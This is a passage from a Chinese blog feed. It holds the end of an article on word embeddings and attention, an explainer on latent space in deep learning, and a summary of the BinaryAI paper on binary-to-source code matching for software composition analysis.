中心词</p><p>今天回头看，这个工作从一开始就注定了成功：原理上，是基于广泛接受的“Distribution Hypothesis”；方法上，使用了拟合能力强大的神经网络模型；最重要的，数据要多少有多少。</p><p>这个方法当然不是终点，它的局限性是明显的 —— 但开创性已经足够了 —— 只是利用和挖掘了“Distribution Hypothesis”的浅层结构。怎么理解这句话呢？</p><p>本质上是因为Word2Vec并没有尝试去理解句子内的语义。因此对于完全相同的上下文，不同的中心词的词义相似性是容易捕捉的；当词义向量的聚类逐渐形成，由近义词构成的上下文，也一定程度上能够标记词义相近的中心词。但人类的语言结构非常复杂，当相同语义通过不同句式、语态、修辞进行表达时，某些近义词对的关系就会可能被深埋。</p><p>看看ChatGPT举的这个例子：</p><blockquote><p>句子1：Driven by an insatiable thirst for knowledge, she stayed late every night, her eyes dancing across the pages of books as if they were starry skies.<br>句子2：Isn’t it unusual, that she, prompted by an unquenchable intellectual curiosity, burns the midnight oil, pouring over pages as though navigating constellations?</p></blockquote><p>两个句子都在描述一个女性深夜仍在阅读，驱使她的是对知识的无尽渴望，两句话也存在非常多意义相近的词对，在不理解语义的情况下，这些词对之间的相似性是难以被辨识的。</p><p>接下来我们可以讨论 GPT 了。</p><p>它是一个有能力理解句子的模型。如果说此前讨论的Word2Vec这类构建词义向量的模型是教计算机“认字”的过程，那么GPT模型的训练，则是一个“认字”+“背书”的过程。老师最后只考书背的好不好，但为了把书背好，GPT 也被动地强化了其认字能力。</p><p><strong>推理的核心是transformer，transformer的核心是attention机制，attention机制是什么？</strong></p><p>一言以蔽之：计算词义向量之间的“距离”后 ，对距离近的词投向更多注意力，而收到高注意力的词义则获得更高的激活值，当预测完成后，通过反向传播算法：当特定的激活帮助了最终的预测，对应词之间关联将被强化，反之则被弱化，模型便是通过这一方式学到了词之间的关系。而在“Distribution Hypothesis”这一视角下，“认字”的实质就是认识一个词和其它词之间的关系。于是就形成了认字为了背书，背书帮助认字的结构。这里提炼一个我个人的观点：</p><p><strong>attention 机制之所以重要和好用，原因之一是可以有效帮助词义向量（embedding）聚类。</strong></p><p>GPT的例子想想其实很有趣，一般的工程思维是将大的问题拆成多个小的问题然后一个一个解决，正如文中开始说的那句：</p><p>让计算机理解自然语言，我们需要做什么？</p><p>计算的基础是数，而自然语言是文字，因此很容易想到要做的第一步是让文字数字化…</p><p>这个表述隐含了一个解决问题的路径：先将文字数字化后，考虑理解句子的问题。有趣的地方是：对词进行向量化编码的最好方法，是直接训练一个理解句子的语言模型；这就像为了让婴儿学会走路，我们直接从跑步开始训练。人类会摔跤会受伤，但机器不会 —— 至少在embodied之前不会，因此人类为了降低代价所建立的步骤化学习过程或许并不适合人工智能 —— 也不难发现，深度学习中，许多好的解决方案往往都是一步到位的。</p><h3 id="4-总结">4 总结</h3><p>这篇文章把我关于语言模型中embedding的理解都介绍完了。但embedding 还不止这些。</p><p>图像可以有embedding，句子和段落也可以有 embedding —— 本质都是通过一组数来表达意义。段落的 embedding 可以作为基于语义搜索的高效索引，AI 绘画技术的背后，有着这两种 embedding 的互动 —— 未来如果有一个大一统的多模态模型，embedding 必然是其中的基石和桥梁 。</p><p>由 AI 掀起的时代浪潮毫无疑问地要来了，今天是一个还难以看清未来的节点。当下能做的为数不多的事情之一还是保持学习。希望这篇文章可以帮到正在学习的你。</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Latent Space - 理解深度学习中的潜在空间</title>
      <link href="/2023/12/18/AILearning/DL/%E7%90%86%E8%A7%A3latent%20space/"/>
      <url>/2023/12/18/AILearning/DL/%E7%90%86%E8%A7%A3latent%20space/</url>
      
        <content type="html"><![CDATA[<h1 id="latent-space理解深度学习中的潜在空间">（Latent Space）理解深度学习中的潜在空间</h1><h2 id="什么是潜在空间">什么是潜在空间？</h2><blockquote><p>If I have to describe latent space in one sentence, it simply means a representation of compressed data.</p></blockquote><blockquote><p>[!NOTE]</p><p>想象一个大的手写数字数据集（0–9），就像上面显示的那样。 与其他不同编号（即3s与7s）的图像相比，相同编号的手写图像（即3的图像）彼此最相似。 但是我们可以训练一种算法来识别这些相似之处吗？ 如何进行？如果您已经训练了一个模型来对数字进行分类，那么您也已经训练了该模型来学习图像之间的“结构相似性”。 实际上，这就是模型能够通过学习每个数字的特征而首先对数字进行分类的方式。这个过程似乎对您“隐藏”了，那根据定义，潜在性即是指“隐藏”。</p></blockquote><p><mark>“潜在空间”的概念很重要，因为<strong>它的用途是“深度学习”的核心-学习数据的特征并简化数据表示形式以寻找模式</strong>。</mark></p><p><strong>其实，Latent Variable这个概念在统计机器学习中并不陌生，概率图模型里从GMM (<strong>高斯混合模型</strong>), HMM(<strong>隐马尔科夫模型</strong>), 到PPCA (<strong>概率PCA</strong>) 和 LDS(<strong>线性动态系统，也叫卡曼滤波</strong>)， 都有Latent Variable的身影。<strong>在这些模型中</strong>，我们用Latent Variable来描述模型对于分布的certainty与uncertainty。因为我们在概率图的框架下用一些分布来拟合给定数据分布时需要这样一个未知变量（Latent Variable）来对拟合函数(用来拟合数据的分布函数， 如高斯分布)们进行一种有效“组合”, 这样的组合可以是线性的，如GMM， 也可以是非线性的，如PPCA，如果我们把时序也考虑进来，就分别有了HMM与LDS。</strong></p><p>**那么以上几种概率图模型中我们其实是在通过学习Latent Variable (Latent Space)来展开学习进程的。**那么深度神经网络呢？ <strong>Latent Space对于深度神经网络的意义在何？</strong></p><p>深度神经网络即深度学习是一种Representation Learning, 表征学习**。顾名思义，学习数据表征。我们的学习过程已经不是靠一些分布来拟合给定数据的分布, 而是通过空间转换来学习数据特征。**</p><p>从什么空间到什么空间呢？ <strong>从数据分布空间到任务的目标分布空间。</strong></p><blockquote><p>[!Note]</p><p>数字识别分类任务，原始数据分布是图片的像素的数值和位置分布空间， 任务目标分布空间是0-9这10个数字对应的离散概率质量分布。 我们在每一层使用向量的线性变换 + 非线性变换的方式将原始分布 (即一个高维向量) 映射到另一个目标分布(即另一个相对低维向量)。 线性变换用到了矩阵变换，batch gradient descent 和 mini-batch gradient descent更新矩阵参数时考虑到了一个 batch(或mini-batch)中所有的映射对， 即<strong>每一次更新参数时考虑了一个 batch(或mini-batch)中所有的映射对</strong>，所以<strong>我们可不可以感性的理解矩阵的参数在经过多次迭代更新后具有了这个分布空间转换的分布特性</strong>。</p></blockquote><p>在inference时我们把每个数据一个一个的放进模型 (深度神经网络)， 经过层层转换，我们得到每个数据的特定特征， 即，稍微不同于其他数据的特征，但还与他们存在某种关系或关联。 这个特征 (向量) 体现在哪儿呢？</p><p><strong>我们为什么要在ML中压缩数据？</strong></p><p>数据压缩定义为使用比原始表示更少的比特对信息进行编码的过程。 这就像获取一个19D数据点（需要19个值来定义唯一点）并将所有这些信息压缩到9D数据点中一样。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191342635.png" alt="image-20240419134254543"></p><p>通常，在机器学习中对数据进行压缩以学习有关数据点的重要信息。 让我用一个例子来解释。</p><p>假设我们想训练一个使用全卷积神经网络（FCN）对图像进行分类的模型。 （即，给定数字图像后输出数字位数）。 <strong><mark>作为模型“学习”，它只是简单地学习每一层的特征（边缘，角度等），并将特征的组合归因于特定的输出。但是，每次模型通过数据点学习时，图像的维数都会先减小，然后才最终增大。 （请参见下面的编码器和瓶颈）。</mark></strong> 当降维时，我们认为这是有损压缩的一种形式。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191343971.webp" alt="img"></p><p>因为需要模型来重建压缩数据（请参见解码器），所以它必须学会存储所有相关信息并忽略噪声。 这就是压缩的价值，它使我们能够摆脱任何无关的信息，而只关注最重要的功能。</p><p><strong>这种“压缩状态”是数据的潜在空间表示。我们所说的空间是什么？</strong></p><p>您可能想知道为什么我们将其称为潜在空间。 毕竟，乍一看，压缩数据可能不会引起任何形式的“空间”。但是，这是平行的。在这个非常简单的示例中，假设我们的原始数据集是尺寸为5 x 5 x 1的图像。我们将潜在空间尺寸设置为3 x 1，这意味着压缩数据点是一个3维向量。</p><blockquote><p>Whenever we graph points or think of points in latent space, we can imagine them as coordinates in space in which points that are “similar” are closer together on the graph</p></blockquote><p>随之而来的自然问题是，我们将如何想象4D点或n维点或什至非矢量的空间（因为不需要将潜在空间表示为2维或3维矢量，而且通常不需要太多） 信息将会丢失）。不能令人满意的答案是，我们不能。 我们是无法理解n维空间（例如n&gt; 3）的3维生物。 但是，有些工具（例如t-SNE）可以将我们的高维潜在空间表示转换为可以可视化的表示（2D或3D）。 （请参阅下面的“可视化潜在空间”一节。）但是您可能想知道什么是“相似”图像，为什么减少数据的维数会使相似图像在空间上“更紧密”在一起？</p><p>相似是什么意思？</p><p>如果我们查看三个图像，其中两个是椅子，一个是桌子，我们很容易地说这两个椅子图像最相似，而桌子与任何一个椅子图像的区别最大。</p><p>但是，什么使这两个椅子图像“更相似”？椅子具有明显的特征（即靠背，无抽屉，两腿之间的连接）。通过学习边缘，角度等的图案，这些都可以被我们的模型“理解”。如所解释的，这样的特征被包装在数据的潜在空间表示中。因此，随着维数的减少，与每个图像截然不同的“外部”信息（即椅子颜色）从我们的潜在空间表示中被“去除”，因为只有每个图像的最重要特征都存储在潜在空间表示中。 结果，随着我们减小尺寸，两把椅子的表示变得越来越不清晰，越来越相似。如果我们想象它们在空间中，它们将“紧密”在一起。请注意，我在<strong>整篇文章中提到的“接近度”指标是一个歧义术语，而不是确定的欧几里得距离，因为空间中存在多种距离定义</strong>。<strong>因为机器“看到的”数据表征形式和我们人用肉眼看和思维理解到的是不一样的！在理解特征向量的时候，我们不能用人类的思维去考量。在概率图里，我们还能把latent variable当作分布出现的似然性，但是在深度神经网络里这样思考feature vector就行不通了。因为它在某种意义上代表了空间转换的特征。</strong></p><h2 id="为什么潜在空间很重要">为什么潜在空间很重要？</h2><p>潜在的空间概念绝对令人着迷。 但是如何使用呢？ 我们什么时候使用它？ 最重要的是，为什么？我们会发现，在我们最喜欢的图像处理网络，生成模型等中，潜在空间是“隐藏的”。尽管潜在空间对大多数人来说是隐藏的，但是在某些任务中，了解潜在空间不仅有帮助，而且是必要的。</p><p><strong>表征学习</strong></p><p>数据的潜在空间表示包含表示原始数据点所需的所有重要信息。然后，该表示必须表示原始数据的特征。换句话说，该模型学习数据特征并简化其表示，从而使其更易于分析。这是称为表示学习（Representation Learning）的概念的核心，该概念定义为允许系统从原始数据中发现特征检测或分类所需的表示的一组技术。在这种用例中，我们的潜在空间表示用于将更复杂的原始数据形式（即图像，视频）转换为更“易于处理”和分析的简单表示。</p><p>下面列出了代表性学习的具体实例。</p><p><strong>Manifolds</strong></p><p>潜在空间是流形学习（表示学习的一个子领域）中必不可少的概念。数据科学中的流形可以理解为在某种程度上“相似”的数据组或子集。一旦我们的数据已在潜在空间中表示出来，就可以发现这些相似性，通常在高维空间中是难以察觉的或模糊不清的。</p><p>以瑞士卷为例</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191421283.png" alt="image-20240419142143218"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191424238.webp" alt="img"></p><p>在3D中，我们知道存在类似数据点的组，但是用更高维度的数据来描绘此类组要困难得多。</p><blockquote><p>通过将数据的维数减少为2D（在这种情况下可以视为“潜在空间”表示），我们可以更轻松地区分数据集中的流形（相似数据组）。</p></blockquote><h2 id="自编码器和生成模型">自编码器和生成模型</h2><p>自编码器是操纵潜在空间中数据“紧密度”的一种常见类型的深度学习模型，它是一种充当身份函数的神经网络。 换句话说，自动编码器会学习输出任何输入的内容。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191424856.webp" alt="img"></p><p>你可能会想知道，为什么在世界上我们需要一个能够做到这一点的模型？ 如果它输出的只是它自己，那似乎就没用了……尽管这种推论是正确的，但我们并不太在乎模型的输出。 <strong>我们更关心模型在此过程中学到的内容</strong>。<strong>当我们强制模型成为身份函数时，我们将其强制以压缩的表示形式存储所有数据的相关特征</strong>，以便以压缩的形式提供足够的信息，以使模型可以“准确地”重建模型。 听起来有点熟？ 应该这样做，因为此压缩表示形式是我们的潜在空间表示形式（上图中的红色块）。</p><p><strong>“压缩”这里听起来有点主成分分析 (PCA) 那意思， 比如PCA里的SVD分解，通过提取数据矩阵在“向量外积合成时”的重要表征 (谁的奇异值大谁就是重要表征) 来实现数据存储的压缩。但是这里的压缩是向量空间转换意义上的维度压缩，和PCA里的“压缩”不一样。前者代表数据本身的特征压缩，而后者代表两个空间进行相互转换时的中介空间的重要特征“压缩”。</strong></p><p>我们已经看到了如何在潜在空间中更容易发现模式，因为相似的数据点将趋于聚集在一起，但是我们还没有看到如何从该潜在空间中采样点以产生“新”数据。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191424892.webp" alt="img"></p><p>在上面的示例中，我们可以<strong>通过在潜在空间上进行插值</strong>，并<strong>使用模型解码器将潜在空间表示重构为二维图像</strong>，并以<strong>与原始输入相同的尺寸来生成不同的面部结构</strong>。</p><p><strong>在潜在空间上插值是什么意思？</strong></p><p>假设我已将上一节中的椅子图像压缩为以下2D向量[0.4，0.5]和[0.45，0.45]。 假设办公桌被压缩为[0.6，0.75]。 如果要在潜在空间上进行插值，则需要对“椅子”群集和“办公桌”群集之间的潜在空间中的点进行采样。我们可以将这些采样的2D向量输入模型的解码器，瞧！ 我们得到的“新”图像看起来像是椅子和桌子之间的变体。 * new用引号引起来，因为这些生成的图像在技术上并不独立于原始数据样本。</p><p>以下是潜在空间中两种椅子之间的线性插值示例。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404191424949.jpeg" alt="动图封面"></p><p>图像生成仍然是研究的活跃领域，<strong>而潜在空间是必须理解的基本概念</strong>。 有关生成模型的更多用例，请参见以下文章，以及使用GAN（生成对抗网络）的潜在空间插值的动手示例，GAN是使用潜在空间表示形式的另一种生成模型。</p><h2 id="可视化潜在空间">可视化潜在空间</h2><p>有关潜在空间可视化的更多信息，我推荐Hackernoon的文章，该文章提供了一个动手实例，可使用t-SNE算法可视化2D空间中数字图像之间的相似性。</p><h2 id="重要要点">重要要点</h2><ul><li>潜在空间只是压缩数据的表示，其中相似的数据点在空间上更靠近在一起。</li><li>潜在空间对于学习数据功能和查找更简单的数据表示形式以进行分析很有用。</li><li>我们可以通过分析潜在空间中的数据（通过流形，聚类等）来了解数据点之间的模式或结构相似性。</li><li>我们可以在潜在空间内插值数据，并使用模型的解码器来“生成”数据样本。</li><li>我们可以使用t-SNE和LLE之类的算法来可视化潜在空间，该算法将我们的潜在空间表示形式转换为2D或3D。</li></ul><p>在学习潜在空间时，我对这个“隐藏但必不可少的概念”着迷。 我希望本文能消除潜在空间表示的神秘性，并提供我作为新手所渴望的对深度学习的“更深入的理解”</p>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DL知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BinaryAI - Binary Software Composition Analysis via Intelligent Binary Source Code Matching</title>
      <link href="/2023/12/18/Papers/binary/Binary%20Software%20Composition%20Analysis%20via%20Intelligent%20Binary%20Source%20Code%20Matching/"/>
      <url>/2023/12/18/Papers/binary/Binary%20Software%20Composition%20Analysis%20via%20Intelligent%20Binary%20Source%20Code%20Matching/</url>
      
        <content type="html"><![CDATA[<p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241531902.png" alt="image-20240424153138830"></p><p>BinaryAI相关的学术论文《BinaryAI: Binary Software Composition Analysis via Intelligent Binary Source Code Matching》已被软件工程领域顶级学术会议 ICSE 2024录用，该项研究由腾讯安全科恩实验室和南方科技大学计算机科学与工程系张煜群教授团队联合完成。</p><p>随着开源软件在商业及个人项目中变得日益普及，开发团队越来越多地依赖外部组件库以加速开发进程，软件供应链的复杂性不断增加，同时也带来了潜在的安全风险。例如，XZ后门漏洞（CVE-2024-3094）导致了潜在的供应链攻击，它影响了Linux/Unix系统中用于处理.xz和.lzma文件的命令行压缩工具XZ Utils。这个漏洞允许攻击者在编译过程中植入恶意代码，进而可能破坏sshd认证并远程获取对整个系统的未授权访问。<strong>二进制软件成分分析（SCA）作为一项重要的软件工程实践，通过对软件构件进行审查，识别二进制中所包含的第三方代码库（Third-party Library, TPL）及其版本号，帮助确定许可证合规性问题和潜在的1-day安全漏洞。</strong></p><p>在此背景下，腾讯安全科恩实验室基于在静态分析和AI安全领域的经验研发出二进制安全智能分析平台—BinaryAI（<a href="https://www.binaryai.cn/%EF%BC%89%EF%BC%8C%E5%85%B6%E6%99%BA%E8%83%BD%E5%88%86%E6%9E%90%E5%BC%95%E6%93%8E%E5%8F%AF%E6%94%AF%E6%8C%81%E8%BD%AF%E4%BB%B6%E6%88%90%E5%88%86%E5%88%86%E6%9E%90%E5%92%8C%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%EF%BC%8C%E5%AF%B9%E7%94%A8%E6%88%B7%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%EF%BC%8CBinaryAI%E5%8F%AF%E4%BB%A5%E5%9C%A8GitHub%E5%85%A8%E9%87%8FC/C++%E5%BA%93%E8%8C%83%E5%9B%B4%E4%B8%AD%E5%81%9A%E7%9B%B8%E4%BC%BC%E6%80%A7%E6%A3%80%E7%B4%A2%EF%BC%8C%E4%BB%A5%E4%B8%9A%E7%95%8C%E9%A2%86%E5%85%88%E7%9A%84%E8%AF%86%E5%88%AB%E5%87%86%E7%A1%AE%E7%8E%87%E5%8C%B9%E9%85%8D%E5%88%B0%E6%96%87%E4%BB%B6%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E5%BC%80%E6%BA%90%E7%BB%84%E4%BB%B6%E3%80%82">https://www.binaryai.cn/），其智能分析引擎可支持软件成分分析和恶意软件分析，对用户上传的二进制文件，BinaryAI可以在GitHub全量C/C++库范围中做相似性检索，以业界领先的识别准确率匹配到文件所使用的开源组件。</a></p><h1 id="1-背景与现状">1 背景与现状</h1><p>二进制SCA可识别的第三方库（TPL）数据集由大规模开源C/C++项目组成，其中大部分是来自GitHub代码库以及GNU/Linux社区的源代码包，通常现有的二进制SCA技术从大规模的TPL数据集中提取源代码特征以构建特征到对应第三方库的倒排索引并存储在SCA数据库中。随后，二进制SCA工具利用代码克隆检测等技术来识别TPL与二进制文件之间的相似代码特征，如果相似特征的比例超过预定义的阈值则将其识别为二进制所包含的开源组件。</p><p>**二进制SCA中的关键步骤是二进制-源代码匹配，这一步骤将二进制代码映射到相应的源代码，进而实现二进制到源代码仓库的相似特征检测。**B2SFinder，作为最先进的二进制SCA工具之一，选择了在编译前后仍保持一致的基本语法特征（例如，字符串常量）来匹配源代码和对应的开源第三方组件。除了二进制SCA之外，二进制-源代码匹配在软件安全的其他场景中也至关重要，例如逆向工程和恶意软件分析等。</p><p>现有二进制SCA利用基本语法特征进行二进制-源代码匹配，建立了二进制代码与TPL源代码之间的对应关系，但是由于C/C++语法特性（例如，函数内联）、编译器优化等因素，二进制代码和源代码之间通常存在巨大差异，因而二进制SCA工具的有效性通常受到影响。首先，这些基本特征在大规模TPL数据集中往往表现出显著的冗余性，降低了各自在数据集中的独特性和有效性，进而影响了SCA的识别精确度。此外，在部分情况下，目标二进制文件与第三方库之间几乎或完全没有共同的基本语法特征，特别是剥离了符号表信息的二进制文件（stripped binary），导致二进制SCA的召回率受到影响。</p><p>因此，**在二进制SCA中采用细粒度的代码特征（例如，函数级特征）是至关重要的，这样可以通过处理高层次的语义信息以减轻基本特征带来的问题。**考虑到编译过程中引入的二进制和源代码函数之间的显著差异，我们在BinaryAI中首次尝试利用海量有监督数据训练自回归大语言模型，<strong>将二进制和源代码特征映射到同一高维向量空间得到其函数向量（function embeddings），并相应地进行二进制到源代码函数的相似度计算和检索匹配，以增强二进制SCA第三方库的识别准确度。</strong></p><h1 id="2-binaryai技术解析">2 BinaryAI技术解析</h1><p>二进制安全智能分析平台BinaryAI基于大模型的二进制-源代码匹配进行二进制软件成分分析。图中展示的BinaryAI基本工作流程由四个阶段组成：</p><p><strong>特征提取、基于大模型的函数向量检索、链接时局部相关性驱动的函数匹配和第三方组件库检测。</strong></p><p>首先，BinaryAI分别从大规模TPL数据集中的代码库提取C/C++源代码函数，以及通过反编译从目标二进制文件中提取类C的伪代码函数（即，二进制函数）。相应地，BinaryAI采用<a href="http://mp.weixin.qq.com/s?__biz=MzU1MjgwNzc4Ng==&amp;mid=2247504387&amp;idx=1&amp;sn=895fb77806e09a74edfb08fd9b9f0ea2&amp;chksm=fbfeee06cc896710da3a9c589eba67c252f9ff6b9dd7644f729f252a9203656d051b0cbe2fa2&amp;scene=21#wechat_redirect">自研的代码匹配模型BAI</a>为源代码和二进制函数生成函数向量用于相似度计算。在BinaryAI中，二进制-源代码匹配过程被划分为两个单独的阶段进行。首先，代码匹配模型BAI架构基于自回归大语言模型，通过学习基于Token的函数语法特征，为每个二进制函数从数据库中检索到top-k相似的源代码函数。接下来，BinaryAI利用额外的结构化信息来捕获函数间的语义特征，进而从top-k个相似函数中准确匹配到对应的源代码函数。最终，BinaryAI通过计算目标二进制与第三方库之间匹配的源代码函数比例识别出二进制包含的第三方库。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241541048.png" alt="image-20240424154141981"></p><h2 id="21-特征提取"><strong>2.1 特征提取</strong></h2><p>**源代码侧：**对于TPL数据集中的每个开源项目，我们收集所有版本中的C/C<ins>源文件，通过tree-sitter内置的解析器构建文件的AST并提取所有的C/C</ins>源代码函数并去重。**与此同时，我们在SCA数据库中维护了两个倒排索引来存储提取的源函数到对应源文件和第三方库的映射关系。**最终，我们从12K个开源项目中提取到了亿数量级独一无二的C/C++源代码函数。</p><p>**二进制侧：**我们利用Ghidra来实时反编译上传后的二进制文件，以生成二进制代码的类C伪代码表示作为二进制函数，用于后续BinaryAI的分析。此外，我们还利用Ghidra提取每个二进制函数的相对虚拟地址作为表示二进制文件中函数链接时局部相关性（link-time locality）的位置序号，以及二进制函数的调用图（function call graph）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241542833.png" alt="image-20240424154219725"></p><h2 id="22-基于大模型的函数向量检索">2.2 基于大模型的函数向量检索</h2><p>BinaryAI的核心是基于函数向量执行函数级别的二进制-源代码匹配，即我们的首要目标是训练一个Embedding模型，该模型能够在单一向量空间中为二进制和源代码函数学习到有意义的向量表示，其中相似的二进制到源函数对在向量空间中保持接近，而不相似的函数向量则相距较远。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241542558.webp" alt="图片"></p><p>对于二进制-源代码匹配，二进制代码和源代码之间可能存在显著差异，然而典型的代码表示学习只匹配单一代码格式，即仅源代码到源代码或者二进制到二进制的代码匹配。现有的大语言模型在自然语言的语法学习方面极为有效，并且这种能力也扩展到了代码语言。尤其是一个在多种编程语言上训练的大模型能够跨不同代码格式识别相似的基于Token的语法特征，这有助于代码克隆检测，即使代码已经被翻译成不同的语言。为此，我们使用现有的大语言模型作为基础模型，并进一步使用标注好的二进制-源代码函数对作为语料库，采用有监督的对比学习方法进行预训练以构建BAI模型。</p><p>在BinaryAI中，我们采用Pythia套件中的模型作为基础模型来初始化BAI模型，然后进一步使用对比学习进行预训练。为了获得大量匹配的二进制源代码函数对作为训练模型的正样本，我们基于官方ArchLinux软件包和Arch用户仓库（AUR）构建了自动化的编译流水线。具体来说，我们使用makepkg命令自动编译所有的ArchLinux软件包。同时，我们通过编译器生成DWARF格式的调试信息。一方面，我们使用Ghidra反编译二进制文件以获得从虚拟地址到二进制函数的映射。另一方面，我们解析DWARF调试信息，并提取从虚拟地址到源文件及行号的映射关系。我们进一步利用tree-sitter来切分文件中相应的源函数。通过合并双方的映射，我们构建了包含10M二进制到源代码函数正样本对的训练语料，平均每个函数具有500个token。</p><p>作为对比学习中的关键要素之一，增加批内负样本（in-batch negatives）可以有效地帮助Embedding模型学习更具区分性的向量表示并提高下游SCA任务的性能。为此，我们使用Info NCELoss损失函数作为我们的对比训练目标，该函数最初设计用于对齐图像和文本标题的向量表示。图中展示了基于CLIP对比学习方法的训练过程，一个批次包含N个二进制到源代码的函数对，CLIP计算所有可能对之间的余弦相似度矩阵。训练目标是通过对称交叉熵损失对矩阵最大化N个正样本之间的相似度，同时最小化其余N*(N-1)个负样本之间的相似度。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241542554.webp" alt="图片"></p><p>我们在BinaryAI中部署了训练好的模型，首先离线地为SCA数据库中的所有源代码函数生成对应的函数向量，并存储到向量数据库。对于在线的二进制SCA，BinaryAI从目标二进制中提取二进制函数，并实时生成二进制函数向量作为查询，从向量数据库中检索给定二进制函数的top-k相似的源代码函数。</p><h2 id="23-链接时局部相关性驱动的二次精排"><strong>2.3 链接时局部相关性驱动的二次精排</strong></h2><p>理想情况下，我们可以直接选择相似度最高的源函数作为匹配结果。然而，由于不同版本间源函数的细微修改，大规模TPL数据集内存在大量相似函数。仅依靠语言模型生成的函数向量来捕捉基于Token的语法特征对于准确匹配源代码函数是不够的，因为检索到的top-k可能非常接近。为此，我们尝试利用链接时局部相关性和函数调用图作为表示结构化的语义特征，这可以帮助在二进制源代码匹配的第二阶段从top-k相似函数中进一步识别出正样本。</p><p>对于用于构建二进制文件的传统C/C++工具链，源代码文件最初由编译器编译成目标文件。随后，链接器解析目标文件之间的符号引用，并将它们组合成二进制文件。通过分析编译过程，我们可以得出几个基本发现。</p><p>1.同一源文件中的所有源函数被编译进单个目标文件，尽管它们相对于源文件的局部位置可能会发生改变。</p><p>2.目标文件被连续地链接进二进制文件，目标文件代码段内的所有函数（即，机器代码格式的二进制函数）保持它们的相对位置不变。</p><p>因此，我们可以进一步推导出，从同一源文件编译的二进制函数在二进制文件中是连续的。我们称之为链接时局部相关性。相应地，给定二进制文件的地址空间，我们可以通过切割包含连续二进制函数的区间来进行逆向，以恢复目标文件的边界（CodeCut问题），并进一步识别出编译进二进制文件的相对应源文件，从而准确匹配出这些文件中包含的源函数。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241543014.webp" alt="图片"></p><p>BinaryAI中链接时局部相关性驱动的函数匹配的具体算法流程如下，首先我们将检索到的top-k相似函数构建为索引文件到二进制源代码函数对的映射。对于每个源文件，我们根据链接时局部相关性驱动对函数对进行排序，并使用两个独立指针的滑动窗口来切片文件，以提取包含连续函数对的区间并映射回二进制文件的地址空间。与其他文件相比，我们发现编译进二进制文件的文件有着更长的函数连续区间。因此，我们将文件选择视为二进制文件地址空间内的区间覆盖问题并且采用贪心算法进行求解，这使我们能够优先选择能够覆盖更多函数对并且较长的函数区间。与此同时，我们进一步利用函数调用图来限定在所选文件内的二进制源函数匹配。最终，我们 将所选文件中所有剩余的函数对更新为二进制到源函数的匹配结果。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241543062.webp" alt="图片"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241543020.webp" alt="图片"></p><h2 id="24-第三方组件库识别"><strong>2.4 第三方组件库识别</strong></h2><p>BinaryAI 获取匹配的源函数后进一步对目标二进制文件运行第三方库检测，（即软件成分分析任务）。通过查询SCA数据库中包含的从源函数到第三方库的倒排索引，我们保留了每个匹配源函数的所有包含的TPL。一般情况下，由于源函数在不同TPL之间中被广泛复用，如果我们保留所有包含的TPL，这种内部的代码克隆可能导致不可避免的误报。为了缓解这个问题，我们基于TPL依赖关系过滤无效的第三方库，该依赖关系显示了TPL之间的复用关系，并且我们只保留被复用方的第三方库。具体来说，我们提前生成TPL依赖关系，作为软件成分分析的额外输入。对于SCA任务，BinaryAI首先从 SCA 数据库中提取每个匹配的源函数的所有包含的 TPL，然后根据 TPL 依赖关系做进一步过滤，同时计算所有保留的函数个数。最后，我们计算每个选定TPL的匹配函数与源函数总数的比率，表示为二进制文件和第三方库的相似性。如果比率超过预定义的阈值，BinaryAI会将其标识为二进制文件中包含的组件。同时，BinaryAI检测这些组件是否会引入安全威胁。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241543041.webp" alt="图片"></p><p>我们从以下三个方面对BinaryAI的性能进行了全面评估：<strong>函数向量的有效性，二进制-源代码函数匹配准确度，二进制-源代码函数匹配准确度</strong>。</p><h1 id="3-评估">3 评估</h1><h2 id="31-函数向量的有效性"><strong>3.1 函数向量的有效性</strong></h2><p>我们首先在基于向量的函数检索方面比较BinaryAI和CodeCMR。CodeCMR作为目前最先进的二进制源代码匹配模型，采用单独的函数编码器（源函数的 DPCNN 和二进制函数的 GNN）和Triplet Loss作为对比学习目标。在两个查询集中BinaryAI在MRR（平均倒数排名）方面都优于CodeCMR。通过结合两个查询集，BinaryAI的MRR达到了0.3407，与CodeCMR的0.1769，这表明BinaryAI检索到的正样本平均排名更高。此外，与CodeCMR相比，BinaryAI有效地将recall@1从10.75%提高到22.54%，recall@100从33.87%提高到56.60%。</p><p>我们进一步研究了基于模型的技术（BinaryAI，CodeCMR）与传统依赖基本特征的技术（BinPro，B2SFinder）之间的差异。我们发现传统技术在检索源代码函数方面的性能相当有限。具体来说，BinPro和B2SFinderMRR都小于0.005，top-100内召回的正样本少于10%，在top-1的召回率不到5%。接下来，我们调查原因后发现几个导致性能下降的因素。首先，数据集中许多源代码函数共享类似的基本特征，这使得有效区分它们变得具有挑战性。其次，作为查询的一些二进制函数缺乏有意义的基本特征，进一步影响了检索结果。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241544318.webp" alt="图片"></p><h2 